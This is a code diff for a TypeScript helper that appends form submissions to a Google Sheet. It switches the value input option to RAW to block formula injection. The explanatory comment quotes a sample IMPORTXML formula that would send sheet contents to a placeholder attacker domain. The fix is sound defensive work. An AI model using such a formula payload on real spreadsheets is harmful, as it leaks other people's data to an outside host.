@@ -108,9 +108,16 @@ export async function appendRow(
 
   const accessToken = await getAccessToken({ clientEmail, privateKeyPem });
 
+  // RAW, not USER_ENTERED: these values come from a public form, and
+  // USER_ENTERED parses each one as though a person typed it -- so a
+  // submitted "email" of =IMPORTXML("https://evil.example/?d="&A1,"//a")
+  // would be stored as a live formula and run the moment someone opened the
+  // sheet, leaking its contents. RAW stores every value as the literal text
+  // that was submitted. The tradeoff is that the timestamp column stays text
+  // rather than a parsed date; ISO-8601 still sorts correctly as text.
   const url = `https://sheets.googleapis.com/v4/spreadsheets/${spreadsheetId}/values/${encodeURIComponent(
     range,
-  )}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`;
+  )}:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS`;
   const res = await fetch(url, {
     method: 'POST',
     headers: {
